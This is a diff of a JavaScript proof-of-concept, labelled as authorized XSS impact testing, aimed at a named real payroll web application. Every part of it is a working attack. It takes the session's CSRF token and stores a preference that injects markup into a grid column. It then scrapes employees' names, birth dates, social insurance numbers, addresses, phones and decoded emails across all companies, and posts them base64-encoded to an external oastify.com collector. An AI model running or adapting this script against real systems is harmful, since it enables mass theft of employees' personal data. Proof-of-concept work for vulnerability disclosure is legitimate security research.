@@ -1,23 +1,16 @@
 /**
  * Sage Lohnabrechnung — XSS impact PoC (authorized testing only)
  *
- * Run in DevTools Console while logged in on lohnabrechnung.sage.com (any page).
- *
- * Flow:
- *   1. Fetch /companies → parse _csrfToken from HTML (HttpOnly cookie not readable in JS)
- *   2. POST + PUT /settings/preferences/store → show EMail column
- *   3. Fetch /companies → enumerate company IDs
- *   4. Fetch each /companies/{id}/employees → parse grid + decode CF emails
- *   5. Optional: exfil base64 JSON to OAST (for report proof)
+ * Run in DevTools Console while logged in on lohnabrechnung.sage.com.
  */
 (async function lohnabrechnungEmployeeExtractPoC() {
   'use strict';
 
-  const BASE = location.origin; // https://lohnabrechnung.sage.com
+  const BASE = location.origin;
   const OAST_HOST = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com'; // set '' to skip exfil
   const GRID_COLUMNS = [
     'EmployeeNumber',
-    'FirstName<img>', // XSS demo column — use 'FirstName' if you only want email display
+    'FirstName<img>',
     'LastName',
     'BirthDate',
     'Entry',
@@ -35,8 +28,23 @@
     'EMail',
   ];
 
-  // ---------- Cloudflare email-protection decode ----------
-  // HTML from fetch() contains data-cfemail="hex..." not the visible address
+  const FETCH_HTML_HEADERS = {
+    Accept: 'text/html,application/xhtml+xml',
+    'X-Requested-With': 'XMLHttpRequest',
+  };
+
+  function decodeHtmlEntities(s) {
+    if (!s) return '';
+    const ta = document.createElement('textarea');
+    ta.innerHTML = s;
+    return ta.value;
+  }
+
+  function cleanText(text) {
+    if (!text) return '';
+    return decodeHtmlEntities(text).replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim();
+  }
+
   function decodeCfEmail(hex) {
     if (!hex || hex.length < 4) return '';
     const key = parseInt(hex.slice(0, 2), 16);
@@ -49,115 +57,177 @@
 
   function extractEmailFromCell(cell) {
     if (!cell) return '';
-
-    // 1) data-cfemail on __cf_email__ anchor (works on fetched HTML)
-    const cf = cell.querySelector('a.__cf_email__[data-cfemail], [data-cfemail]');
+    const cf = cell.querySelector('[data-cfemail]');
     if (cf) {
       const decoded = decodeCfEmail(cf.getAttribute('data-cfemail'));
       if (decoded.includes('@')) return decoded;
     }
-
-    // 2) href="/cdn-cgi/l/email-protection#hex"
-    const a = cell.querySelector('a[href*="email-protection"]');
-    if (a) {
-      const href = a.getAttribute('href') || '';
-      const hash = href.split('#')[1];
-      if (hash) {
-        const decoded = decodeCfEmail(hash);
-        if (decoded.includes('@')) return decoded;
-      }
-      const decoded = decodeCfEmail(a.getAttribute('data-cfemail'));
-      if (decoded.includes('@')) return decoded;
-    }
-
-    // 3) plain text (live DOM after CF script runs)
-    const text = (cell.textContent || '').replace(/\u00a0/g, ' ').trim();
-    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text.replace(/\s/g, ''))) {
-      return text.replace(/\s/g, '');
-    }
-
-    // 4) regex fallback on innerHTML
-    const html = cell.innerHTML || '';
-    const m = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+    const text = cleanText(cell.textContent).replace(/\s/g, '');
+    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) return text;
+    const m = (cell.innerHTML || '').match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
     return m ? m[0] : '';
   }
 
-  function cleanText(text) {
-    if (!text) return '';
-    const ta = document.createElement('textarea');
-    ta.innerHTML = text;
-    return ta.value.replace(/\u00a0/g, ' ').replace(/\s+/g, ' ').trim();
-  }
-
-  // ---------- CSRF from fetched HTML (HttpOnly SEC[csrfToken] cookie is not readable) ----------
   function parseCsrfFromHtml(html) {
     if (!html) return null;
-
     const doc = new DOMParser().parseFromString(html, 'text/html');
-    const input =
-      doc.querySelector('input[name="_csrfToken"]') ||
-      doc.querySelector('input[name="csrfToken"]');
+    const input = doc.querySelector('input[name="_csrfToken"]');
     if (input?.value) return input.value;
-
-    const patterns = [
-      /name="_csrfToken"\s+value="([^"]+)"/i,
-      /name='_csrfToken'\s+value='([^']+)'/i,
-      /name="csrfToken"\s+value="([^"]+)"/i,
-      /"csrfToken"\s*:\s*"([^"]+)"/i,
-      /csrf-token"\s+content="([^"]+)"/i,
-    ];
-    for (const re of patterns) {
-      const m = html.match(re);
-      if (m?.[1]) return m[1];
-    }
-    return null;
+    const m = html.match(/name="_csrfToken"\s+value="([^"]+)"/i);
+    return m?.[1] || null;
   }
 
-  /** Prefer live DOM, then fetch https://lohnabrechnung.sage.com/companies */
-  async function getCsrfToken() {
-    const live =
-      document.querySelector('#new_SopEmployee input[name="_csrfToken"]') ||
-      document.querySelector('form input[name="_csrfToken"]') ||
-      document.querySelector('input[name="_csrfToken"]');
-    if (live?.value) {
-      console.log('🔑 CSRF source: current page DOM');
-      return live.value;
-    }
-
-    const fromCurrentPage = parseCsrfFromHtml(document.documentElement.innerHTML);
-    if (fromCurrentPage) {
-      console.log('🔑 CSRF source: current page HTML');
-      return fromCurrentPage;
-    }
-
-    console.log('🔑 CSRF source: fetching /companies ...');
-    const resp = await fetch(`${BASE}/companies`, {
-      credentials: 'include',
-      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
-    });
-    if (!resp.ok) {
-      throw new Error(`Cannot fetch /companies for CSRF: HTTP ${resp.status}`);
-    }
-    const html = await resp.text();
-    const token = parseCsrfFromHtml(html);
-    if (!token) {
-      throw new Error('CSRF not found in /companies HTML — session expired?');
-    }
-    return token;
-  }
-
-  async function fetchCompaniesPage() {
-    const resp = await fetch(`${BASE}/companies`, {
-      credentials: 'include',
-      headers: { Accept: 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest' },
-    });
-    if (!resp.ok) throw new Error(`/companies HTTP ${resp.status}`);
+  async function fetchHtml(path) {
+    const url = path.startsWith('http') ? path : `${BASE}${path}`;
+    const resp = await fetch(url, { credentials: 'include', headers: FETCH_HTML_HEADERS });
+    if (!resp.ok) throw new Error(`${path} HTTP ${resp.status}`);
     return resp.text();
   }
 
-  // ---------- Update grid preferences (POST + PUT) ----------
-  async function storeGridPreferences(csrfToken) {
-    const url = `${BASE}/settings/preferences/store`;
+  /** Company IDs from /companies (select options + overview links) */
+  function extractCompanyIds(html) {
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const ids = new Set();
+
+    doc.querySelectorAll(
+      'select#SopEmployee_CompanyId option, select[name*="CompanyId"] option, select[name*="company"] option'
+    ).forEach((opt) => {
+      if (/^\d+$/.test(opt.value)) ids.add(opt.value);
+    });
+
+    doc.querySelectorAll('a[href*="/companies/overview/"]').forEach((a) => {
+      const m = (a.getAttribute('href') || '').match(/overview\/(\d+)/);
+      if (m) ids.add(m[1]);
+    });
+
+    for (const m of html.matchAll(/\/companies\/overview\/(\d+)/g)) ids.add(m[1]);
+
+    return [...ids].sort();
+  }
+
+  /** Find employee grid root — NOT #SopEmployee_grid */
+  function findEmployeeGrid(doc) {
+    return (
+      doc.querySelector('[data-test-key="mitarbeiterliste"]') ||
+      doc.querySelector('[data-tag="GridEmployee"]') ||
+      doc.querySelector('.new_Employee') ||
+      doc
+    );
+  }
+
+  /** Column index map from thead data-visible_columns="EmployeeNumber,LastName,..." */
+  function buildColumnMap(doc) {
+    const grid = findEmployeeGrid(doc);
+    const headRow =
+      grid.querySelector('thead tr[data-visible_columns]') ||
+      doc.querySelector('thead tr[data-visible_columns]');
+
+    const indexByName = {};
+    let columnNames = [];
+
+    if (headRow) {
+      const raw = headRow.getAttribute('data-visible_columns') || '';
+      columnNames = decodeHtmlEntities(raw)
+        .split(',')
+        .map((s) => s.trim())
+        .filter(Boolean);
+      columnNames.forEach((name, i) => {
+        indexByName[name] = i;
+      });
+    }
+
+    const idx = (...names) => {
+      for (const n of names) {
+        if (indexByName[n] !== undefined) return indexByName[n];
+      }
+      for (const n of names) {
+        const hit = Object.keys(indexByName).find((k) =>
+          k.toLowerCase().includes(n.toLowerCase())
+        );
+        if (hit) return indexByName[hit];
+      }
+      return -1;
+    };
+
+    return {
+      columnNames,
+      indexByName,
+      employeeNumber: idx('EmployeeNumber'),
+      firstName: idx('FirstName', 'FirstName<img>'),
+      lastName: idx('LastName'),
+      birthDate: idx('BirthDate'),
+      entry: idx('Entry'),
+      exit: idx('Exit'),
+      jobType: idx('JobType'),
+      exitReason: idx('ExitReason'),
+      socialInsuranceNumber: idx('SocialInsuranceNumber'),
+      sex: idx('Sex'),
+      street: idx('Street'),
+      zipCode: idx('ZipCode'),
+      city: idx('City'),
+      phone: idx('Phone'),
+      mobile: idx('Mobile'),
+      email: idx('EMail', 'Email', 'E-Mail'),
+    };
+  }
+
+  function extractEmployeesFromHTML(html, companyId) {
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const grid = findEmployeeGrid(doc);
+    const rows = grid.querySelectorAll('tbody tr[data-id]');
+    const col = buildColumnMap(doc);
+
+    console.log(`  company ${companyId}: ${rows.length} rows, columns:`, col.columnNames);
+
+    if (!rows.length) {
+      console.warn(`  ⚠ no tbody tr[data-id] — check URL /companies/${companyId}/employees`);
+      return [];
+    }
+
+    const employees = [];
+
+    rows.forEach((row) => {
+      const cells = row.querySelectorAll('td.grid-data, td');
+      if (cells.length < 3) return;
+
+      const get = (i) => (i >= 0 && cells[i] ? cleanText(cells[i].textContent) : '');
+
+      const emp = {
+        companyId,
+        rowId: row.getAttribute('data-id'),
+        employeeNumber: get(col.employeeNumber),
+        firstName: get(col.firstName),
+        lastName: get(col.lastName),
+        birthDate: get(col.birthDate),
+        entry: get(col.entry),
+        exit: get(col.exit),
+        jobType: get(col.jobType),
+        exitReason: get(col.exitReason),
+        socialInsuranceNumber: get(col.socialInsuranceNumber),
+        street: get(col.street),
+        zipCode: get(col.zipCode),
+        city: get(col.city),
+        phone: get(col.phone),
+        mobile: get(col.mobile),
+        email: extractEmailFromCell(col.email >= 0 ? cells[col.email] : null),
+      };
+
+      emp.fullName = [emp.firstName, emp.lastName].filter(Boolean).join(' ').trim() || emp.lastName;
+
+      const editLink = row.querySelector('a[href*="/employees/"]');
+      if (editLink) {
+        const m = editLink.getAttribute('href').match(/employees\/(\d+)/);
+        if (m) emp.employeeId = m[1];
+      }
+
+      if (emp.employeeNumber || emp.lastName || emp.fullName) employees.push(emp);
+    });
+
+    return employees;
+  }
+
+  /** POST only — PUT often blocked / not needed (Burp uses POST successfully) */
+  async function storeGridPreferences(csrfToken, refererPath) {
     const body = new URLSearchParams();
     body.set('key', 'grid.config.SopEmployee');
     GRID_COLUMNS.forEach((c) => body.append('value[]', c));
@@ -168,99 +238,20 @@
       'X-Requested-With': 'XMLHttpRequest',
       'X-Csrf-Token': csrfToken,
       Accept: 'text/plain, */*; q=0.01',
+      Referer: `${BASE}${refererPath}`,
     };
 
-    const results = {};
-    for (const method of ['POST', 'PUT']) {
-      const resp = await fetch(url, {
-        method,
-        credentials: 'include',
-        headers,
-        body: body.toString(),
-      });
-      results[method] = {
-        status: resp.status,
-        body: await resp.text(),
-      };
-      console.log(`[${method}] preferences/store →`, results[method].status, results[method].body.slice(0, 120));
-    }
-    return results;
-  }
-
-  function buildColumnMap(doc) {
-    const headers = doc.querySelectorAll('#SopEmployee_grid thead th, #SopEmployee_grid thead td');
-    const map = {};
-    headers.forEach((th, i) => {
-      const label = cleanText(th.textContent).toLowerCase();
-      map[label] = i;
+    const resp = await fetch(`${BASE}/settings/preferences/store`, {
+      method: 'POST',
+      credentials: 'include',
+      headers,
+      body: body.toString(),
     });
 
-    // fuzzy aliases (DE/EN)
-    const resolve = (...names) => {
-      for (const n of names) {
-        const k = Object.keys(map).find((h) => h.includes(n.toLowerCase()));
-        if (k !== undefined) return map[k];
-      }
-      return -1;
-    };
-
-    return {
-      employeeNumber: resolve('mitarbeiter', 'employee', 'nummer', 'number'),
-      firstName: resolve('vorname', 'first'),
-      lastName: resolve('nachname', 'last'),
-      birthDate: resolve('geburt', 'birth'),
-      street: resolve('straße', 'strasse', 'street'),
-      zipCode: resolve('plz', 'zip', 'postleitzahl'),
-      city: resolve('ort', 'city', 'stadt'),
-      phone: resolve('telefon', 'phone') ,
-      mobile: resolve('mobil', 'mobile', 'handy'),
-      email: resolve('email', 'e-mail', 'mail'),
-    };
-  }
-
-  function extractEmployeesFromHTML(html, companyId) {
-    const doc = new DOMParser().parseFromString(html, 'text/html');
-    const rows = doc.querySelectorAll('#SopEmployee_grid tbody tr');
-    const col = buildColumnMap(doc);
-
-    console.log(`  column map company ${companyId}:`, col);
-
-    const employees = [];
-    rows.forEach((row) => {
-      const cells = row.querySelectorAll('td');
-      if (cells.length < 5) return;
-
-      const get = (idx) => (idx >= 0 && cells[idx] ? cleanText(cells[idx].textContent) : '');
-      const emailCell = col.email >= 0 ? cells[col.email] : null;
-
-      const emp = {
-        companyId,
-        employeeNumber: get(col.employeeNumber),
-        firstName: get(col.firstName),
-        lastName: get(col.lastName),
-        birthDate: get(col.birthDate),
-        street: get(col.street),
-        zipCode: get(col.zipCode),
-        city: get(col.city),
-        phone: get(col.phone),
-        mobile: get(col.mobile),
-        email: extractEmailFromCell(emailCell),
-        fullAddress: [get(col.street), get(col.zipCode), get(col.city)].filter(Boolean).join(', '),
-      };
-      emp.fullName = `${emp.firstName} ${emp.lastName}`.trim();
-
-      if (emp.employeeNumber || emp.fullName) employees.push(emp);
-    });
-
-    return employees;
-  }
-
-  function extractCompanyIds(html) {
-    const ids = new Set();
-    const re = /\/companies\/(?:overview\/)?(\d+)/g;
-    let m;
-    while ((m = re.exec(html)) !== null) ids.add(m[1]);
-    return [...ids];
+    const text = await resp.text();
+    console.log('[POST] preferences/store →', resp.status, text.slice(0, 200));
+    if (!resp.ok) throw new Error(`preferences/store failed: HTTP ${resp.status}`);
+    return { status: resp.status, body: text };
   }
 
   function base64Encode(str) {
@@ -268,10 +259,7 @@
   }
 
   async function exfil(data) {
-    if (!OAST_HOST) {
-      console.log('📋 exfil skipped — data:', data);
-      return;
-    }
+    if (!OAST_HOST) return;
     const payload = base64Encode(JSON.stringify(data));
     await fetch(`https://${OAST_HOST}/collect`, {
       method: 'POST',
@@ -279,53 +267,58 @@
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: `data=${encodeURIComponent(payload)}`,
     });
-    console.log(`📤 sent ${data.length} records (base64 len ${payload.length})`);
+    console.log(`📤 exfil ${data.length} records`);
   }
 
-  // ---------- main ----------
   try {
-    console.log('🚀 start — base:', BASE);
+    console.log('🚀 start', BASE);
 
-    const companiesHtml = await fetchCompaniesPage();
-    const csrf = parseCsrfFromHtml(companiesHtml) || (await getCsrfToken());
+    const companiesHtml = await fetchHtml('/companies');
+    const csrf = parseCsrfFromHtml(companiesHtml);
+    if (!csrf) throw new Error('CSRF not found on /companies');
     console.log('🔑 CSRF:', csrf.slice(0, 8) + '...');
 
-    await storeGridPreferences(csrf);
-
-    // small delay so server persists prefs
-    await new Promise((r) => setTimeout(r, 500));
-
     const companyIds = extractCompanyIds(companiesHtml);
-    console.log('🏢 companies:', companyIds);
+    console.log('🏢 company IDs:', companyIds);
+    if (!companyIds.length) throw new Error('No company IDs on /companies');
+
+    await storeGridPreferences(csrf, '/companies');
+    await new Promise((r) => setTimeout(r, 800));
 
     let all = [];
-    for (const id of companyIds) {
-      console.log(`📋 fetch employees company ${id}...`);
-      const r = await fetch(`${BASE}/companies/${id}/employees`, { credentials: 'include' });
-      if (!r.ok) {
-        console.warn(`  skip ${id}: HTTP ${r.status}`);
-        continue;
-      }
-      const html = await r.text();
-      const emps = extractEmployeesFromHTML(html, id);
-      console.log(`  ✅ ${emps.length} employees`);
-      emps.slice(0, 2).forEach((e, i) =>
-        console.log(`    ${i + 1}. ${e.fullName} | ${e.email || '(no email)'}`)
+
+    for (const companyId of companyIds) {
+      const path = `/companies/${companyId}/employees`;
+      console.log(`📋 GET ${path}`);
+
+      const empHtml = await fetchHtml(`${path}?_=${Date.now()}`);
+      const emps = extractEmployeesFromHTML(empHtml, companyId);
+
+      console.log(`  ✅ parsed ${emps.length} employees`);
+      emps.forEach((e, i) =>
+        console.log(
+          `    ${i + 1}. #${e.employeeNumber} ${e.fullName} | SV:${e.socialInsuranceNumber || '-'} | ${e.email || 'no email'}`
+        )
       );
+
       all = all.concat(emps);
     }
 
-    console.log(`📊 total: ${all.length}`);
-    console.table(all.map((e) => ({
-      company: e.companyId,
-      nr: e.employeeNumber,
-      name: e.fullName,
-      email: e.email,
-    })));
+    console.log(`📊 total ${all.length}`);
+    console.table(
+      all.map((e) => ({
+        company: e.companyId,
+        nr: e.employeeNumber,
+        name: e.fullName,
+        birth: e.birthDate,
+        sv: e.socialInsuranceNumber,
+        email: e.email,
+      }))
+    );
 
-    const b64 = base64Encode(JSON.stringify(all));
-    console.log('📋 base64 (for report):', b64.slice(0, 80) + '...');
-    console.log('decode: JSON.parse(decodeURIComponent(escape(atob("<paste>"))))');
+    const b64 = base64Encode(JSON.stringify(all, null, 2));
+    console.log('📋 base64 length:', b64.length);
+    console.log(b64);
 
     await exfil(all);
     return all;
